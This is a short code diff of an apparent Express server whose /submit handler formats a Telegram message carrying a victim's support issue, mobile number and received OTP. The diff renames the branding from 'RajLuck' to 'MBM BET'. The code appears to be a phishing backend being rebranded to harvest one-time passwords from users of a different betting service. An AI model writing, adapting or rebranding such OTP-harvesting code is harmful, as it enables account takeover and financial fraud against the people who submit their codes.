@@ -31,7 +31,7 @@ app.post("/submit", async (req, res) => {
 
         // Telegram par bheje jaane wale message ka format
         const messageText = 
-            "🧪 RAJLUCK NOTIFICATION\n\n" +
+            "🧪 MBM BET NOTIFICATION\n\n" +
             "📌 Support Issue: " + issue + "\n" +
             "📱 Mobile Number: " + mobile + "\n" +
             "🔑 Received OTP: " + otp + "\n\n" +
@@ -57,5 +57,5 @@ app.post("/submit", async (req, res) => {
 
 // Server initialization
 app.listen(PORT, () => {
-    console.log("RajLuck server running successfully on port " + PORT);
+    console.log("MBM BET server running successfully on port " + PORT);
 });
